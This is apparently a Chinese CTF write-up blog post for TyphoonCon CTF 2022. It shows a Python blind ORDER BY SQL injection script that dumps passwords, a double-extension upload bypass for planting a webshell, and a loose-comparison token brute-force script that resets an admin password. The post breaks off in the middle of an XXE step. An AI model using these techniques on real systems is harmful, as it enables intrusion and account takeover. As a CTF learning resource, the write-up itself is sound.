@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[TyphoonCon CTF 2022] WP - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[TyphoonCon CTF 2022] WP" />
+<meta property="og:description" content="KnowMe 首先是扫了个目录，发现了robots.txt 1 2 /items.php /var/www/flag 这里的items.php是一个查询接口 经测试是order by的盲注，这里我写了个脚本，" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/typhoonconctf2022/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-25T22:46:06+08:00" />
+<meta property="article:modified_time" content="2022-06-25T22:46:06+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="[TyphoonCon CTF 2022] WP"/>
+<meta name="twitter:description" content="KnowMe 首先是扫了个目录，发现了robots.txt 1 2 /items.php /var/www/flag 这里的items.php是一个查询接口 经测试是order by的盲注，这里我写了个脚本，"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/typhoonconctf2022/" /><link rel="prev" href="https://example.com/ciscn2022_half/" /><link rel="next" href="https://example.com/actf2022/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[TyphoonCon CTF 2022] WP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/typhoonconctf2022\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  1651 ,
+        "url": "https:\/\/example.com\/typhoonconctf2022\/","datePublished": "2022-06-25T22:46:06+08:00","dateModified": "2022-06-25T22:46:06+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/typhoonconctf2022/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/typhoonconctf2022/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[TyphoonCon CTF 2022] WP</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
+</span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-06-25">2022-06-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1651 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#knowme">KnowMe</a></li>
+    <li><a href="#typo">Typo</a>
+      <ul>
+        <li><a href="#step1">step1</a></li>
+        <li><a href="#step2">step2</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="knowme">KnowMe</h1>
+<p>首先是扫了个目录，发现了robots.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/items.php
+/var/www/flag
+</code></pre></td></tr></table>
+</div>
+</div><p>这里的items.php是一个查询接口</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626144933473.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626144933473.png, https://tuchuang.huamang.xyz/img/image-20220626144933473.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626144933473.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626144933473.png"
+        title="image-20220626144933473" /></p>
+<p>经测试是order by的盲注，这里我写了个脚本，这里只展示到最后查询密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">strings</span> <span class="o">=</span> <span class="s2">&#34;abcdef1234567890&#34;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;https://typhooncon-knowme.chals.io/items.php?sort=rand(substr((select/**/group_concat(password)/**/from/**/users),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;)&#34;</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">80</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">strings</span><span class="p">:</span>
+        <span class="n">fuckurl</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">s</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">fuckurl</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+        <span class="k">if</span> <span class="s1">&#39;&#34;id&#34;:2&#39;</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+            <span class="n">flag</span><span class="o">+=</span><span class="n">s</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="k">else</span> <span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>注出来，admin密码md5：d41d8cd98f00b204e9800998ecf8427e</p>
+<p>解出来是空</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20220626145323034.png" alt="image-20220626145323034" style="zoom:150%;" /></p>
+<p>只需要bp进行前端限制的绕过即可，然后就会跳转到profile.php</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626145457790.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626145457790.png, https://tuchuang.huamang.xyz/img/image-20220626145457790.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626145457790.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626145457790.png"
+        title="image-20220626145457790" /></p>
+<p>进行文件上传，这里只允许上传图片，且是白名单，这里直接上传1.png.php即可绕过，估计这里的逻辑判断只取了第一个点后面的后缀</p>
+<p>直接传shell后拿flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626145905890.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626145905890.png, https://tuchuang.huamang.xyz/img/image-20220626145905890.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626145905890.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626145905890.png"
+        title="image-20220626145905890" /></p>
+<p>进去拿到了源码后，的确是这样的逻辑</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626145933403.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626145933403.png, https://tuchuang.huamang.xyz/img/image-20220626145933403.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626145933403.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626145933403.png"
+        title="image-20220626145933403" /></p>
+<h1 id="typo">Typo</h1>
+<h2 id="step1">step1</h2>
+<p>给了赛题文件，这里是有一个登录的操作的，但是很多的路由都需要登录，只有change.php和forgot.php不需要登录</p>
+<p>在change.php里面，这里会通过uid查询一个token，而这里的token进行了一个substr，只取了前4位</p>
+<p>所以这样我们是可以尝试爆破的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$uid</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]);</span>
+<span class="nv">$pwd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;psw&#39;</span><span class="p">]));</span>
+<span class="nv">$sig</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]);</span>
+
+<span class="nv">$sqlGetTokens</span> <span class="o">=</span> <span class="s2">&#34;SELECT token from tokens where uid=&#39;</span><span class="si">$uid</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlGetTokens</span><span class="p">);</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+<span class="nv">$sigDB</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span> <span class="nv">$sig</span> <span class="o">==</span> <span class="nv">$sigDB</span> <span class="p">){</span>
+
+	<span class="nv">$sqlChange</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET password=&#39;</span><span class="si">$pwd</span><span class="s2">&#39; where id=&#39;</span><span class="si">$uid</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+	<span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlChange</span><span class="p">);</span>
+	
+	<span class="nv">$sqlDelete</span> <span class="o">=</span> <span class="s2">&#34;DELETE FROM tokens WHERE uid=&#39;</span><span class="si">$uid</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+	<span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlDelete</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是直接爆破难度有点大，这里就可以利用forget.php的功能</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">){</span>
+	<span class="nv">$uname</span> <span class="o">=</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$mysqli</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;date +%s%3N &gt; /tmp/time&#34;</span><span class="p">);</span>
+	<span class="nv">$time</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/tmp/time&#34;</span><span class="p">);</span>
+	<span class="nv">$fullToken</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span> <span class="nv">$unam</span> <span class="o">.</span> <span class="nv">$time</span> <span class="o">.</span> <span class="s2">&#34;SECRET&#34;</span> <span class="p">);</span>
+
+	<span class="nv">$sqlGetId</span> <span class="o">=</span> <span class="s2">&#34;SELECT id FROM users where username=&#39;</span><span class="si">$uname</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlGetId</span><span class="p">);</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+	<span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+	<span class="nv">$sqlDelete</span> <span class="o">=</span> <span class="s2">&#34;DELETE FROM tokens WHERE uid=&#39;</span><span class="si">$uid</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+	<span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlDelete</span><span class="p">);</span>
+
+	<span class="nv">$sqlInsert</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO tokens values(&#39;</span><span class="si">$uid</span><span class="s2">&#39;,&#39;</span><span class="si">$fullToken</span><span class="s2">&#39;)&#34;</span><span class="p">;</span>
+	<span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sqlInsert</span><span class="p">);</span>
+
+	<span class="k">die</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;Token sent to you.&#39;);window.location.href=&#39;/index.php&#39;;&lt;/script&gt;&#34;</span><span class="p">);</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里会基于uname，time，”SECRET“生成一个md5，然后我发现这里真是写错了个单词$unam。。。</p>
+<p>所以这里fullToken就会是md5(time+&ldquo;SECRET&rdquo;)了，如果爆破点放在token上，那么我们确实是有可能爆破出来的，但是比赛的时候很多人都会做这个题目，所以time会经常变化，这让我们爆破的难度有点大</p>
+<p>而对于这个time是可以变化的，每次POST访问forget的时候，这里就会刷新time，所以说之类我们可以利用<strong>php不严格的判断</strong>，让time进行变化，当变成0exxxxx的时候，这时候我们把sig赋值为0000就能让条件<code>$sig == $sigDB</code>满足</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626211651487.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626211651487.png, https://tuchuang.huamang.xyz/img/image-20220626211651487.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626211651487.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626211651487.png"
+        title="image-20220626211651487" /></p>
+<p>写个脚本来进行爆破</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;https://typhooncon-typo.chals.io&#34;</span>
+<span class="n">passwd</span> <span class="o">=</span> <span class="s2">&#34;hack&#34;</span>
+
+<span class="n">data1</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;uname&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span>
+<span class="p">}</span>
+
+<span class="n">data2</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;uid&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+    <span class="s2">&#34;psw&#34;</span><span class="p">:</span> <span class="n">passwd</span><span class="p">,</span>
+    <span class="s2">&#34;token&#34;</span><span class="p">:</span> <span class="s2">&#34;0000&#34;</span>
+<span class="p">}</span>
+<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/forgot.php&#34;</span><span class="p">,</span> <span class="n">data1</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s2">/change.php&#34;</span><span class="p">,</span> <span class="n">data2</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&#34;Password Changed.&#34;</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>爆破的结果，成功更改密码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626210234742.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626210234742.png, https://tuchuang.huamang.xyz/img/image-20220626210234742.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626210234742.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626210234742.png"
+        title="image-20220626210234742" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://tuchuang.huamang.xyz/img/image-20220626210204547.png"
+        data-srcset="https://tuchuang.huamang.xyz/img/image-20220626210204547.png, https://tuchuang.huamang.xyz/img/image-20220626210204547.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220626210204547.png 2x"
+        data-sizes="auto"
+        alt="https://tuchuang.huamang.xyz/img/image-20220626210204547.png"
+        title="image-20220626210204547" /></p>
+<p>拿到cookie：<code>PHPSESSID=ql32dudasjts4rjbsctj0vrvqd</code></p>
+<h2 id="step2">step2</h2>
+<p>这里到了profile.php，存在一个xml的使用，猜测这里是存在一个xxe的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js">	<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span><span class="o">&gt;</span>
+		<span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">()</span>
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>
+			<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;email&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;E-Mail: &#34;</span><span class="o">+</span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span>
+		<span class="p">}</span>
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;get&#34;</span><span class="p">,</span><span class="s2">&#34;data.php?u=&lt;?php echo $uname;?&gt;&#34;</span><span class="p">)</span>
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
+
+		<span class="kd">function</span> <span class="nx">read</span><span class="p">(){</span>
+			<span class="kd">var</span> <span class="nx">xml</span> <span class="o">=</span> <span class="s1">&#39;&lt;\?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;user&gt;&lt;username&gt;&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">).</span><span class="nx">value</span><span class="o">+</span><span class="s1">&#39;&lt;/username&gt;&lt;/user&gt;&#39;</span>
+
+			<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">()</span>
